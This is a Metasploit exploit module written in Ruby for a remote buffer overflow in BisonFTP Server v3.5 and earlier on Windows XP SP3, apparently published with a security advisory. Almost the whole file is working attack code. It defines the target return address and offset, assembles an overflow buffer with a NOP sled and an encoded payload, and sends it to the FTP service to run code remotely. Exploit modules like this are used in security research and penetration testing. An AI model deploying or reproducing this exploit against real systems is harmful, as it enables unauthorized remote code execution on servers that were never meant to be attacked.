##############################################################################
#
# Title    : BisonFTP Server Remote Buffer Overflow Exploit
# Author   : Veerendra G.G SecPod Technologies (www.secpod.com)
# Advisory : http://secpod.org/blog/?p=384
#            http://secpod.org/msf/bison_server_bof.rb
# Version  : BisonFTP Server <= v3.5
# Date     : 09/07/2011
#
###############################################################################

##
# $Id: bison_server_bof.rb 2011-08-19 03:13:45Z veerendragg $
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'BisonFTP Server Remote Buffer Overflow Vulnerability',
			'Description'    => %q{
						This module exploits a buffer overflow vulnerability
						found in the BisonFTP Server <= v3.5.
			},
			'Author'         => 
				[
					'localh0t',		# Initial PoC
					'veerendragg @ SecPod',	# Metasploit Module
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 1.0 $',
			'References'     =>
				[
					[ 'BID', '49109'],
					[ 'CVE', '1999-1510'],
					[ 'URL', 'http://secpod.org/blog/?p=384'],
					[ 'URL', 'http://www.exploit-db.com/exploits/17649'],
					[ 'URL', 'http://secpod.org/msf/bison_server_bof.rb'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space' => 388,
					'BadChars' => "\x00\x0a\x0d",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP3 EN',
						{
							'Ret' => 0x0040333f, # call edx from Bisonftp.exe
							'Offset' => 1432
						}
					],
				],
			'DisclosureDate' => 'Aug 07 2011',
			'DefaultTarget'	=> 0))
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")
		print_status("Connected to #{datastore['RHOST']}:#{datastore['RPORT']}")
		sploit = rand_text_alpha(1028)					## Random Buffer
		sploit << "\x90" * 16						## Padding
		sploit << payload.encoded					## Encoded Payload
		sploit << "\x90" * (388 - payload.encoded.length)		## More Nops
		sploit << [target.ret].pack('V')				## Return Address
		sploit << rand_text_alpha(39)					## MOre Buffer

		print_status("Sending payload...")
		sock.put(sploit)

		handler
		disconnect
	end

end
